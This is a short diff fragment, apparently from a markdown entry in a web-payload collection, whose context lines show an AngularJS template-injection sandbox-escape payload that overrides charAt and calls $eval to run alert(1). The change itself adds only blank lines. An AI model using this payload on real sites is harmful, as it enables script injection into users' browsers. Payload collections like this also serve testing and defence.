@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:51.896096+00:00'
 ```javascript
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
 ```
+
+
